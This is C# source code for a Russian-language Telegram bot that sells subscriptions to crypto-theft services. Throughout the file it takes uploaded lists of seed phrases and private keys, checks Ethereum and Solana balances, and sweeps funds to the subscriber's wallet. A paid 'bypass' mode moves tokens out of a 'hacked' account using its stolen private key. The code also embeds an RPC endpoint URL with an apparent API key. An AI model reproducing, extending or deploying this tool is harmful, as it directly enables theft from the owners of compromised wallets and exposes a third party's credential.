using MetaTools;
using MetaTools.Crypto;
using MetaTools.Cryptos;
using MetaTools.Database;
using MetaTools.PaymentMethods;
using Nethereum.HdWallet;
using Nethereum.Web3;
using Solnet.Extensions;
using Solnet.Rpc;
using Solnet.Wallet;
using SQLite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.ReplyMarkups;

namespace YourEasyBot
{
    public static class Utils
    {
        public static HttpClient client = new HttpClient();
        public static TokenMintResolver resolver = TokenMintResolver.Load();
        public static IRpcClient solanaRPC = ClientFactory.GetClient("https://bold-still-butterfly.solana-mainnet.quiknode.pro/1ae740c0e36ddb32797bf15fa012dfa606a07592/");
    }

    internal class YourBot : EasyBot
    {
        public static SQLiteAsyncConnection db = new SQLiteAsyncConnection("data/db.db");
        public static TokenMintResolver resolver = TokenMintResolver.Load();
        static async Task Main(string[] args)
        {
            await db.CreateTableAsync<User>();
            await db.CreateTableAsync<Subscription>();
            var bot = new YourBot("ТОКЕН БОТА");
            bot.Run();
        }

        public YourBot(string botToken) : base(botToken) { }

        public override async Task OnPrivateChat(Telegram.Bot.Types.Chat chat, Telegram.Bot.Types.User user, UpdateInfo update)
        {
            var db_User = await MetaTools.Database.Database.get_User(db, chat.Id);
            if (update.UpdateKind == UpdateKind.NewMessage && update.MsgCategory == MsgCategory.Text)
            {
                if (update.Message.Text == "/start")
                {
                    await Telegram.SendTextMessageAsync(chat, "Добро пожаловать! by @kittyspig", replyMarkup: Keyboards.mainMenu);
                    return;
                }
                else if (update.Message.Text.StartsWith("/sub"))
                {
                    if (Config.admins.Contains(chat.Id))
                    {
                        string[] args = update.Message.Text.Split();

                        int days = int.Parse(args[1]);
                        string sub_name = args[2];
                        if (args[3].Trim() == "all")
                        {
                            int passed = 0;
                            List<Subscription> updated = new List<Subscription>();
                            foreach (Subscription s in (await db.Table<Subscription>().ToListAsync()).Where(s => s.ends > DateTime.Now))
                            {
                                s.ends = s.ends.AddDays(days);
                                updated.Add(s);
                                passed++;
                            }
                            await db.UpdateAllAsync(updated);
                            await Telegram.SendTextMessageAsync(chat, "Вы выдали " + passed + " подписок");


                        }
                        else
                        {
                            long id = long.Parse(args[3]);
                            await Subscription.set_Subscription(db, id, sub_name, days);

                            await Telegram.SendTextMessageAsync(-1001646013534, $"*Юзеру* `{id}` *выдано* `{days}` *дней подписки на* `{sub_name}`\n*Выдал:* `@{chat.Username}`", ParseMode.Markdown);
                            await Telegram.SendTextMessageAsync(id, $"*Вам было выдано* `{days}` *дней подписки на* `{sub_name}`", ParseMode.Markdown);
                        }
                    }
                }
                else if (update.Message.Text.StartsWith("/ad"))
                {
                    if (Config.admins.Contains(chat.Id))
                    {
                        await Telegram.SendTextMessageAsync(chat, "Начал рассылку.");
                        var users = await db.Table<MetaTools.Database.User>().ToListAsync();
                        int sent = 0;
                        int errors = 0;
                        foreach (MetaTools.Database.User u in users)
                        {
                            try
                            {
                                await Telegram.SendTextMessageAsync(u.id, update.Message.Text.Remove(0, 4));
                                sent++;
                            }
                            catch { errors++; }
                        }
                        await Telegram.SendTextMessageAsync(chat, $"Отправленно {sent}\nОшибок: {errors}");
                        return;
                    }
                }
                else if (update.Message.Text.StartsWith("/seno"))
                {
                    if (!(await Subscription.GetActiveSubs(db, chat.Id)).Select(e => e.name).Contains("withdraw"))
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "❌ Для того что бы воспользоватся данным функционалом, вам нужно приобрести подписку.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    string mnemo = update.Message.Text.Remove(0, 5);
                    Task.Run(async () =>
                    {
                        var eth = new Ethereum() { recipient = db_User.wallet };


                        try
                        {
                            await eth.withdraw(mnemo);
                        }
                        catch
                        {

                        }
                        await Telegram.SendTextMessageAsync(chat, "Results:\n " + string.Join("\n", eth.results));
                    });
                    return;
                }
            }


            if (update.UpdateKind == UpdateKind.CallbackQuery)
            {
                ReplyCallback(update);
                if (update.CallbackData == "profile")
                {
                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, $"*🆔 Ваш ID:* `{chat.Id}`\n*💰 Ваш баланс:* `{db_User.balance}`\n*💰 Ваш кошель:* `{db_User.wallet}`", ParseMode.Markdown, replyMarkup: Keyboards.profile);
                    return;
                }
                else if (update.CallbackData == "subscriptions")
                {
                    var activeSubs = await Subscription.GetActiveSubs(db, chat.Id);
                    if (activeSubs.Count == 0)
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, $"*У вас нет активных подписок.*", ParseMode.Markdown, replyMarkup: Keyboards.cancel);
                    }
                    else
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, $"Ваши подписки:\n{string.Join("\n", activeSubs.Select(s => $"*{s.name} | Заканчивается:* `{s.ends.ToString()}`"))}", ParseMode.Markdown, replyMarkup: Keyboards.cancel);
                    }
                }
                else if (update.CallbackData == "deposit")
                {
                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, $"*Введите желаемую сумму (минимум 10$)*", ParseMode.Markdown, replyMarkup: Keyboards.cancel);
                    int amount = 0;
                    var success = int.TryParse(await NewTextMessage(update), out amount);
                    if (success)
                    {
                        var payment_id = await CrystalPay.GeneratePayment(amount);
                        InlineKeyboardMarkup payment = new InlineKeyboardMarkup(
                            new[] {
                                new InlineKeyboardButton[]
                                {
                                    new("Оплатить") { Url = "https://pay.crystalpay.ru/?i=" + payment_id },
                                    new("Проверить") { CallbackData = "check|" + payment_id + "|" + amount },
                                },
                            });

                        await Telegram.SendTextMessageAsync(chat, $"💰 Пополнение на {amount}$", ParseMode.Markdown, replyMarkup: payment);

                    }
                    else
                    {
                        await Telegram.SendTextMessageAsync(chat, "Произошла ошибка.");
                    }
                    return;
                }
                else if (update.CallbackData.StartsWith("check|"))
                {
                    string payment_id = update.CallbackData.Remove(0, 6).Split("|")[0];
                    int amount = Convert.ToInt32(update.CallbackData.Remove(0, 6).Split("|")[1]);
                    var paid = await CrystalPay.CheckPayment(payment_id);
                    if (paid)
                    {
                        await Telegram.SendTextMessageAsync(-1001646013534, $"💰 Пополнение на: {amount}$\nПополнил: {chat.Id}", ParseMode.Markdown);
                        db_User.balance += Convert.ToInt32(amount);
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, $"Оплата найдена.\nНа ваш баланс начисленно: {amount}$");
                        await db.UpdateAsync(db_User);
                    }
                    else
                    {
                        await Telegram.SendTextMessageAsync(chat, "Оплата не найдена");
                    }
                    return;
                }
                else if (update.CallbackData == "buy_sub")
                {
                    InlineKeyboardMarkup subs = new InlineKeyboardMarkup(
                    new[] {
                                new InlineKeyboardButton[]
                                {
                                    new("Вывод+чек") { CallbackData = "withdraw" },
                                    new("Обход") { CallbackData = "bypass" },
                                },
                    });



                    var sub = await ButtonClicked(update, await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "*Прайс на подписки:*\n*Вывод:* `50$/месяц`\n*Обход*: `180$/месяц`", ParseMode.Markdown, replyMarkup: subs));

                    if ((await Subscription.GetActiveSubs(db, chat.Id)).Where(s => s.name == sub).Count() != 0)
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "У вас уже есть подписка.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    if (sub == "withdraw")
                    {
                        if (db_User.balance < 50)
                        {
                            await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Недостаточно средств на балансе.", replyMarkup: Keyboards.cancel);
                            return;
                        }

                        db_User.balance -= 50;
                        await db.UpdateAsync(db_User);
                        await Subscription.set_Subscription(db, chat.Id, sub, 30);
                        await Telegram.SendTextMessageAsync(chat, "Вы успешно приобрели подписку " + sub + " на 30 дней.");
                        await Telegram.SendTextMessageAsync(-1001646013534, $"Пользователь @{chat.Username} приобрел подписку {sub} на 30 дней.");
                    }
                    else if (sub == "bypass")
                    {
                        if (db_User.balance < 180)
                        {
                            await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Недостаточно средств на балансе.", replyMarkup: Keyboards.cancel);
                            return;
                        }

                        db_User.balance -= 180;
                        await db.UpdateAsync(db_User);
                        await Subscription.set_Subscription(db, chat.Id, sub, 30);
                        await Telegram.SendTextMessageAsync(chat, "Вы успешно приобрели подписку " + sub + " на 30 дней.");
                        await Telegram.SendTextMessageAsync(-1001646013534, $"Пользователь @{chat.Username} приобрел подписку {sub} на 30 дней.");
                    }
                    await Telegram.SendTextMessageAsync(chat, "❗ Поменяйте кошелёк для вывода/обхода в профиле\n❗ Ответственность за потерянные средства мы не несём");
                    return;

                }
                else if (update.CallbackData == "set_wallet")
                {
                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Отправьте кошелек.", replyMarkup: Keyboards.cancel);
                    await NewTextMessage(update);

                    db_User.wallet = update.Message.Text;
                    await db.UpdateAsync(db_User);
                    await Telegram.SendTextMessageAsync(chat, $"{db_User.wallet} успешно установлен!");
                    return;
                }
                else if (update.CallbackData == "cancel")
                {
                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Главное меню", replyMarkup: Keyboards.mainMenu);
                    return;
                }
                else if (update.CallbackData == "check_wallets")
                {
                    if (!(await Subscription.GetActiveSubs(db, chat.Id)).Select(e => e.name).Contains("withdraw"))
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "❌ Для того что бы воспользоватся данным функционалом, вам нужно приобрести подписку.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Отправьте .txt файл с фразами.@kittyspig", replyMarkup: Keyboards.cancel);
                    MemoryStream fs = new MemoryStream();
                    await Telegram.DownloadFileAsync((await Telegram.GetFileAsync((await NewTxtFile(update)).FileId)).FilePath, fs);
                    List<string> file_content = Encoding.UTF8.GetString(fs.ToArray()).Split("\n").Distinct().ToList();
                    Task.Run(async () =>
                    {
                        var progressMsg = await Telegram.SendTextMessageAsync(chat, $"*🔥 Найдено* `{file_content.Count}` *строк*\n*✔️ Начинаем проверку!*", parseMode: ParseMode.Markdown);
                        int passed = 0;
                        bool work = true;
                        Task.Run(async () =>
                        {
                            while (work)
                            {

                                await Task.Delay(10000);
                                try
                                {
                                    await Telegram.EditMessageTextAsync(chat, progressMsg.MessageId, $"🗿 Проверенно: {passed}/{file_content.Count}");
                                }
                                catch { }
                            }
                        });

                        List<Crypto> all_crypto = new List<Crypto>()
                        {
                            new Ethereum(),
                            new Solana()
                        };

                        await Parallel.ForEachAsync(file_content, new ParallelOptions() { MaxDegreeOfParallelism = 20 }, async (mnemonic, cancellationToken) =>
                        {
                            await Parallel.ForEachAsync(all_crypto, new ParallelOptions() { MaxDegreeOfParallelism = 4 }, async (crypto, cancellationToken) =>
                            {
                                await crypto.check(mnemonic);
                            });

                            passed++;
                        });

                        work = false;
                        await Telegram.SendTextMessageAsync(chat, $"✔️ Проверка завершена.");

                        foreach (var crypto in all_crypto)
                        {
                            if (crypto.results.Count != 0)
                            {
                                using (var ms = new MemoryStream())
                                {
                                    TextWriter tw = new StreamWriter(ms);
                                    tw.Write(string.Join("\n", crypto.results));
                                    tw.Flush();
                                    ms.Position = 0;
                                    await Telegram.SendDocumentAsync(chat, new InputOnlineFile(ms, crypto.name + ".txt"));
                                }
                            }
                        }

                    });
                }
                else if (update.CallbackData == "withdraw_privatekeys")
                {
                    if (!(await Subscription.GetActiveSubs(db, chat.Id)).Select(e => e.name).Contains("withdraw"))
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "❌ Для того что бы воспользоватся данным функционалом, вам нужно приобрести подписку.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Отправьте .txt файл с приватками.", replyMarkup: Keyboards.cancel);
                    MemoryStream fs = new MemoryStream();
                    await Telegram.DownloadFileAsync((await Telegram.GetFileAsync((await NewTxtFile(update)).FileId)).FilePath, fs);
                    List<string> file_content = Encoding.UTF8.GetString(fs.ToArray()).Split("\n").Distinct().ToList();
                    Task.Run(async () =>
                    {
                        var progressMsg = await Telegram.SendTextMessageAsync(chat, $"*🔥 Найдено* `{file_content.Count}` *строк*\n*✔️ Начинаем проверку!*", parseMode: ParseMode.Markdown);
                        int passed = 0;
                        bool work = true;
                        Task.Run(async () =>
                        {
                            while (work)
                            {

                                await Task.Delay(10000);
                                try
                                {
                                    await Telegram.EditMessageTextAsync(chat, progressMsg.MessageId, $"🗿 Проверенно: {passed}/{file_content.Count}");
                                }
                                catch { }
                            }
                        });


                        var eth = new Ethereum();

                        await Parallel.ForEachAsync(file_content, new ParallelOptions() { MaxDegreeOfParallelism = 20 }, async (mnemonic, cancellationToken) =>
                        {
                            await eth.withdrawPK(mnemonic);
                            passed++;
                        });

                        work = false;
                        await Telegram.SendTextMessageAsync(chat, $"✔️ Проверка завершена.");


                        if (eth.results.Count != 0)
                        {
                            using (var ms = new MemoryStream())
                            {
                                TextWriter tw = new StreamWriter(ms);
                                tw.Write(string.Join("\n", eth.results));
                                tw.Flush();
                                ms.Position = 0;
                                await Telegram.SendDocumentAsync(chat, new InputOnlineFile(ms, eth.name + ".txt"));
                            }
                        }

                    });
                }
                else if (update.CallbackData == "check_privatekeys")
                {
                    if (!(await Subscription.GetActiveSubs(db, chat.Id)).Select(e => e.name).Contains("withdraw"))
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "❌ Для того что бы воспользоватся данным функционалом, вам нужно приобрести подписку.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Отправьте .txt файл с приватками.", replyMarkup: Keyboards.cancel);
                    MemoryStream fs = new MemoryStream();
                    await Telegram.DownloadFileAsync((await Telegram.GetFileAsync((await NewTxtFile(update)).FileId)).FilePath, fs);
                    List<string> file_content = Encoding.UTF8.GetString(fs.ToArray()).Split("\n").Distinct().ToList();
                    Task.Run(async () =>
                    {
                        var progressMsg = await Telegram.SendTextMessageAsync(chat, $"*🔥 Найдено* `{file_content.Count}` *строк*\n*✔️ Начинаем проверку!*", parseMode: ParseMode.Markdown);
                        int passed = 0;
                        bool work = true;
                        Task.Run(async () =>
                        {
                            while (work)
                            {

                                await Task.Delay(10000);
                                try
                                {
                                    await Telegram.EditMessageTextAsync(chat, progressMsg.MessageId, $"🗿 Проверенно: {passed}/{file_content.Count}");
                                }
                                catch { }
                            }
                        });


                        var eth = new Ethereum();

                        await Parallel.ForEachAsync(file_content, new ParallelOptions() { MaxDegreeOfParallelism = 20 }, async (mnemonic, cancellationToken) =>
                        {
                            await eth.checkPK(mnemonic);

                            passed++;
                        });

                        work = false;
                        await Telegram.SendTextMessageAsync(chat, $"✔️ Проверка завершена.");


                        if (eth.results.Count != 0)
                        {
                            using (var ms = new MemoryStream())
                            {
                                TextWriter tw = new StreamWriter(ms);
                                tw.Write(string.Join("\n", eth.results));
                                tw.Flush();
                                ms.Position = 0;
                                await Telegram.SendDocumentAsync(chat, new InputOnlineFile(ms, eth.name + ".txt"));
                            }
                        }

                    });
                }
                else if (update.CallbackData == "withdraw_wallets")
                {
                    if (!(await Subscription.GetActiveSubs(db, chat.Id)).Select(e => e.name).Contains("withdraw"))
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "❌ Для того что бы воспользоватся данным функционалом, вам нужно приобрести подписку.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Отправьте .txt файл.", replyMarkup: Keyboards.cancel);
                    var file = await Telegram.GetFileAsync((await NewTxtFile(update)).FileId);
                    MemoryStream fs = new MemoryStream();
                    await Telegram.DownloadFileAsync(file.FilePath, fs);
                    List<string> file_content = Encoding.UTF8.GetString(fs.ToArray()).Split("\n").Distinct().ToList();
                    Task.Run(async () =>
                    {
                        var progressMsg = await Telegram.SendTextMessageAsync(chat, $"*🔥 Найдено* `{file_content.Count}` *строк*\n*✔️ Начинаем проверку!*", parseMode: ParseMode.Markdown);
                        int passed = 0;
                        bool work = true;
                        Task.Run(async () =>
                        {
                            while (work)
                            {

                                await Task.Delay(10000);
                                try
                                {
                                    await Telegram.EditMessageTextAsync(chat, progressMsg.MessageId, $"🗿 Проверенно: {passed}/{file_content.Count}");
                                }
                                catch { }
                            }
                        });

                        var eth = new Ethereum() { recipient = db_User.wallet };
                        await Parallel.ForEachAsync(file_content, new ParallelOptions() { MaxDegreeOfParallelism = 20 }, async (mnemonic, cancellationToken) =>
                        {
                            await eth.withdraw(mnemonic);
                            passed++;
                        });

                        work = false;
                        await Telegram.SendTextMessageAsync(chat, $"✔️ Проверка завершена.");
                        if (eth.results.Count != 0)
                        {
                            using (var ms = new MemoryStream())
                            {
                                TextWriter tw = new StreamWriter(ms);
                                tw.Write(string.Join("\n", eth.results));
                                tw.Flush();
                                ms.Position = 0;
                                await Telegram.SendDocumentAsync(chat, new InputOnlineFile(ms, "withdraw.txt"));
                            }
                        }

                    });
                }

                else if (update.CallbackData == "bypass_auto")
                {
                    if (!(await Subscription.GetActiveSubs(db, chat.Id)).Select(e => e.name).Contains("bypass"))
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "❌ Для того что бы воспользоватся данным функционалом, вам нужно приобрести подписку.", replyMarkup: Keyboards.cancel);
                        return;
                    }

                    Bypass bypass = new Bypass();

                    InlineKeyboardButton[][] ik = Bypass.chains.Select(item => new[]
     {
           InlineKeyboardButton.WithCallbackData(item.name, item.name)
     }).ToArray();

                    var ask_chain = await Telegram.SendTextMessageAsync(chat, "Выберите сеть.", replyMarkup: new InlineKeyboardMarkup(ik));

                    var chain = await ButtonClicked(update, ask_chain);

                    bypass.chain = Bypass.chains.Where(e => e.name == chain).First();


                    await Telegram.SendTextMessageAsync(chat, "Отправьте приватный ключ аккаунта.", replyMarkup: Keyboards.cancel);

                    bypass.hacked = new Nethereum.Web3.Accounts.Account(await NewTextMessage(update), bypass.chain.chain_id);

                    await Telegram.SendTextMessageAsync(chat, "Отправьте контракт адрес.", replyMarkup: Keyboards.cancel);
                    bypass.contract_address = await NewTextMessage(update);

                    bypass.recipient = db_User.wallet;
                    bypass.create();
                    await bypass.calculate_fees();

                    await Telegram.SendTextMessageAsync(chat, $"Отправьте {Web3.Convert.FromWeiToBigDecimal((bypass.token_fee * 8) + (bypass.transfer_fee * 8))} на адрес {bypass.sender.Address}\n" +
                                                              $"Сид от этого адреса: {bypass.words}\n" +
                                                              $"После отправки напишите: \"ok\"", replyMarkup: Keyboards.cancel);

                    if ((await NewTextMessage(update)).ToLower() == "ok")
                    {
                        Task.Run(async () =>
                        {
                            await Telegram.SendTextMessageAsync(chat, "Начали обход.");
                            await bypass.withdraw();
                            await Telegram.SendTextMessageAsync(chat, "Обход завершен!");
                        });
                    }
                    else
                    {
                        await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "Меню.", replyMarkup: Keyboards.mainMenu);
                    }
                    return;
                }
                else if (update.CallbackData == "feedback")
                {
                    await Telegram.EditMessageTextAsync(chat, update.Message.MessageId, "бот слит by @kittyspig", replyMarkup: Keyboards.cancel);
                    return;
                }
            }

        }




    }
}
